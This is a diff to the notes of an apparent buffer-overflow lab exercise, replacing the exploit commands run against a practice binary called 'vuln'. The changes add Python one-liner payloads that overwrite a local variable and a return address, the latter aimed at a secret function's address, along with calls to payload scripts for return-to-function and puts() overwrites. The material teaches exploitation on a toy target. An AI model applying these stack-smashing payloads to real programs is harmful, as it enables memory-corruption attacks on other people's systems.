@@ -124,13 +124,18 @@ Disassembly of section .text:
 # We use the Python exploit scripts to determine each exploit.
 
 # Overwrite the local variable. Print message "Comm-link online."
-python exploit_local_var.py | ./bo_exploit.exe
+python payload_local_var.py | ./vuln 
+python -c 'print 0x40*"A" + "\x5a\x5a\x5a\x5a"' | ./vuln
 
 # Overwrite return address. Print message "Channel open."
-python exploit_secret_func.py | ./bo_exploit.exe
+# nm vuln +> & of secret func is 0x080491a7
+python -c 'print 0x48*"A" + "\xa7\x91\x04\x08"' | ./vuln
 
 # Overwrite return address with function parameters. Print message "Systems functional."
-python exploit_secret_param_func.py | ./bo_exploit.exe
+# get &secret_param_func from nm vuln| grep func 
+python payload_secret_param_func.py | ./vuln 
 
 # Print secret_message by overwriting with address of puts() function. Print message "Acknowledged H.Q."
-python exploit_print_secret_message.py | ./bo_exploit.exe
+python payload_secret_message.py | ./vuln
+
+
